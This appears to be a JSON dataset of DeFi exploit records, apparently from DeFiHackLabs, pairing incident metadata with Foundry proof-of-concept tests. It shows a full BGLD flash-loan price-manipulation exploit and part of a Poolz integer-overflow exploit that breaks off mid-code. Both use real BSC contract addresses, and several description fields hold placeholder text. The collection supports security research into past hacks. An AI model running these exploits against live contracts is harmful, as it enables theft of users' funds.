only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "811c348123",
        "is_ready": false,
        "content": "### 20221212 - BGLD (Deflationary token) - FlashLoan price manipulation\n### Lost: $18k\n#### Contract\n[BGLD_exp.sol](src/test/BGLD_exp.sol)\n#### Link reference\nhttps://twitter.com/BlockSecTeam/status/1602335214356660225",
        "date": "20221212",
        "target": "BGLD (Deflationary token)",
        "attack_title": "FlashLoan price manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1602335214356660225",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/BGLD_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1602335214356660225\n// @TX\n// https://bscscan.com/tx/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae\ninterface ERCPorxy{\n    function migrate() external;\n}\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 oldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);\n    IERC20 newBGLD = IERC20(0x169f715CaE1F94C203366a6890053E817C767B7C);\n    IERC20 DEBT = IERC20(0xC632F90affeC7121120275610BF17Df9963F181c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    ERCPorxy Proxy = ERCPorxy(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    Uni_Pair_V2 WBNB_oldBGLD = Uni_Pair_V2(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);\n    Uni_Pair_V2 oldBGLD_DEBT = Uni_Pair_V2(0x429339fa7A2f2979657B25ed49D64d4b98a2050d);\n    Uni_Pair_V2 newBGLD_DEBT = Uni_Pair_V2(0x559D0deAcAD259d970f65bE611f93fCCD1C44261);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23844529);\n    }\n    function testExploit() public {\n        oldBGLD.approve(address(Router), type(uint).max);\n        oldBGLD.approve(address(Proxy), type(uint).max);\n        newBGLD.approve(address(Router), type(uint).max);\n        DEBT.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(125 * 1e18, 0, address(this), new bytes(1)); // FlashLoan WBNB\n        Proxy.migrate(); // migrate oldBGLD to newBGLD\n        newBGLDToDEBT();\n        newBGLD_DEBT.swap(0, 950 * 1e9, address(this), new bytes(1)); // FlashLoan DEBT\n        Proxy.migrate();\n        newBGLDToDEBT();\n        DEBTToUSDT();\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18);\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18);\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.transfer(address(WBNB_oldBGLD), WBNB.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(oldBGLD);\n        uint[] memory values = Router.getAmountsOut(125 * 1e18, path);\n        WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), \"\");\n        oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);\n        WBNB_oldBGLD.skim(address(this));\n        WBNB_oldBGLD.sync();\n        oldBGLDToWBNB();\n        WBNB.transfer(dodo, 125 * 1e18);\n    }\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        DEBT.transfer(address(oldBGLD_DEBT), DEBT.balanceOf(address(this)));\n        (uint oldBGLDreserve, uint DEBTreserve,) = oldBGLD_DEBT.getReserves();\n        uint amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;\n        uint amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10000 + amountIn * 9975);\n        oldBGLD_DEBT.swap(amountOut * 90 / 100, 0, address(this), \"\");\n        oldBGLD.transfer(address(oldBGLD_DEBT), oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10);\n        oldBGLD_DEBT.skim(address(this));\n        oldBGLD_DEBT.sync();\n        oldBGLDToDEBT();\n        uint loanAmount = 950 * 1e9;\n        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10000 / 9975 + 1000);\n    }\n    function oldBGLDToWBNB() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(oldBGLD);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6,\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function newBGLDToDEBT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(newBGLD);\n        path[1] = address(DEBT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(newBGLD.balanceOf(address(this)) * 90 / 100,\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function oldBGLDToDEBT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(oldBGLD);\n        path[1] = address(DEBT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6,\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function DEBTToUSDT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(DEBT);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(DEBT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n}",
                "token_count": 1674,
                "interfaces": [
                    {
                        "name": "ERCPorxy",
                        "content": "interface ERCPorxy{\n    function migrate() external;\n}\n",
                        "token_count": 13,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "c701a4aa83",
        "is_ready": false,
        "content": "### 20230315 - Poolz - integer overflow\n### Lost: ~$390K\n#### Contract\n[poolz_exp.sol](src/test/poolz_exp.sol)\n#### Link Reference\nhttps://twitter.com/peckshield/status/1635860470359015425",
        "date": "20230315",
        "target": "Poolz",
        "attack_title": "integer overflow",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/peckshield/status/1635860470359015425",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/poolz_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\ncontract ContractTest is Test {\n    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 constant mnz  = IERC20(0x861f1E1397daD68289e8f6a09a2ebb567f1B895C);\n    IERC20 constant wod  = IERC20(0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6);\n    IERC20 constant sip  = IERC20(0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA);\n    IERC20 constant ecio  = IERC20(0x327A3e880bF2674Ee40b6f872be2050Ed406b021);\n    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    LockedDeal constant   poolzpool = LockedDeal(payable(0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26475403);\n    }\n    function testExploit() external {\n        bytes memory data ;\n        address assetTo = address(this);\n        data = \"poolz\";\n        dppAdvanced.flashLoan(1e18, 0, assetTo, data);\n    }\n    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {\n        if(keccak256(data) == keccak256(\"poolz\")){\n            console.log(\"Flashloan attacks\");\n            emit log_named_decimal_uint(\"[Before mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            address[] memory swapPath = new address[](3);\n            wbnb.withdraw(1e18);\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(mnz);\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n            mnz.approve(address(poolzpool), type(uint256).max);\n            sip.approve(address(poolzpool), type(uint256).max);\n            ecio.approve(address(poolzpool), type(uint256).max);\n            wod.approve(address(poolzpool), type(uint256).max);\n            mnz.approve(address(pancakeRouter), type(uint256).max);\n            sip.approve(address(pancakeRouter), type(uint256).max);\n            ecio.approve(address(pancakeRouter), type(uint256).max);\n            wod.approve(address(pancakeRouter), type(uint256).max);\n            uint256 mnz_balance = mnz.balanceOf(address(poolzpool));\n            uint256 overflow_data;\n            overflow_data = type(uint256).max - mnz_balance + 2;\n            uint64[] memory begintime = new uint64[](2);\n            begintime[0] = uint64(block.timestamp);\n            begintime[1] = uint64(block.timestamp);\n            uint256[] memory transfer_data = new uint256[](2);\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = mnz_balance;\n            address[] memory owner_addr = new address[](2);\n            owner_addr[0] = address(this);\n            owner_addr[1] = address(this);\n            uint256 firstPoolId;\n            uint256 lastPoolId;\n            (firstPoolId,  lastPoolId) = poolzpool.CreateMassPools(address(mnz),\n                begintime,\n                transfer_data,\n                owner_addr);\n            poolzpool.WithdrawToken(lastPoolId);\n            uint256 mnz_number = mnz.balanceOf(address(this));\n            emit log_named_decimal_uint(\"[mnz Exp] mnz pool balance\", mnz_number, 18);\n            sellmnz();\n            emit log_named_decimal_uint(\"[After mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            wbnb.withdraw(1e18);\n            emit log_named_decimal_uint(\"[Before sip Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(sip);\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n            uint256 sip_balance = sip.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n            overflow_data = type(uint256).max - sip_balance + 2;\n            transfer_data[0] = overflow_data;\n            